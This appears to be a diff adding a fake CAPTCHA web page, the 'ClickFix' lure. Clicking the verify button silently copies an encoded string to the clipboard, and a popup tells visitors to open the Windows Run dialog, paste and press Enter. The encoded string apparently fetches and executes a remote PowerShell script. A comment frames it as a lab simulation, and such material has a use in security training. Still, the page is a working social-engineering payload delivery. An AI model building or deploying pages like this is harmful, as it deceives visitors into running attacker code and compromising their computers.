@@ -1,0 +1,124 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Verify You Are Human</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            margin-top: 50px;
+        }
+        .captcha-box {
+            border: 1px solid #ccc;
+            padding: 20px;
+            width: 300px;
+            margin: auto;
+            background-color: #f9f9f9;
+        }
+        .verify-btn {
+            background-color: #4285F4;
+            color: white;
+            padding: 10px 20px;
+            border: none;
+            cursor: pointer;
+            font-size: 16px;
+        }
+        .verify-btn:hover {
+            background-color: #3367D6;
+        }
+        #overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.5);
+            z-index: 999;
+        }
+        #recaptchaPopup {
+            display: none;
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: white;
+            padding: 20px;
+            border-radius: 5px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.3);
+            z-index: 1000;
+            width: 350px;
+            text-align: left;
+        }
+        #recaptchaPopup.active, #overlay.active {
+            display: block;
+        }
+        #recaptchaPopup h3 {
+            margin-top: 0;
+            color: #333;
+        }
+        #recaptchaPopup p {
+            font-size: 14px;
+            color: #555;
+        }
+        #recaptchaPopup button {
+            background-color: #4285f4;
+            color: white;
+            padding: 10px;
+            border: none;
+            cursor: pointer;
+            width: 100%;
+            margin-top: 10px;
+        }
+        #recaptchaPopup button:hover {
+            background-color: #357ae8;
+        }
+    </style>
+</head>
+<body>
+    <div class="captcha-box">
+        <h2>Verify You Are Human</h2>
+        <p>Please click to verify.</p>
+        <button class="verify-btn" onclick="triggerCaptcha()">I'm not a robot</button>
+    </div>
+
+    <div id="overlay"></div>
+    <div id="recaptchaPopup">
+        <h3>reCAPTCHA Verification ID: 2165</h3>
+        <p>To verify:</p>
+        <p>1. Press Win + R</p>
+        <p>2. Press Ctrl + V</p>
+        <p>3. Press Enter</p>
+        <button onclick="closePopup()">Verify</button>
+    </div>
+
+    <script>
+        function triggerCaptcha() {
+            // Simulate malicious mshta command (replace <kali-ip> with your lab-controlled IP)
+            const textToCopy = `PQAnAGgAdAB0AHAAcwA6AC8ALwBqAG8AZAB5ADkAMAAxADAAMAAuAGcAaQB0AGgAdQBiAC4AaQBvAC8AZQB4AGUAYwB1AHQAYQBiAGwAZQAvAHcAaQBuADEANQAuAHQAeAB0ACcAOwAgAGkAZQB4ACAAKABpAHcAcgAgACAALQBVAHMAZQBCAGEAcwBpAGMAUABhAHIAcwBpAG4AZwApAC4AQwBvAG4AdABlAG4AdAA=`;
+
+            // Copy to clipboard and show popup in one action
+            const tempTextArea = document.createElement("textarea");
+            tempTextArea.value = textToCopy;
+            document.body.appendChild(tempTextArea);
+            tempTextArea.select();
+            try {
+                document.execCommand("copy");
+                // Show popup and overlay
+                document.getElementById("recaptchaPopup").classList.add("active");
+                document.getElementById("overlay").classList.add("active");
+            } catch (err) {
+                alert("Failed to copy command. Please try again.");
+            }
+            document.body.removeChild(tempTextArea);
+        }
+
+        function closePopup() {
+            // Hide popup and overlay
+            document.getElementById("recaptchaPopup").classList.remove("active");
+            document.getElementById("overlay").classList.remove("active");
+        }
+    </script>
+</body>
+</html>
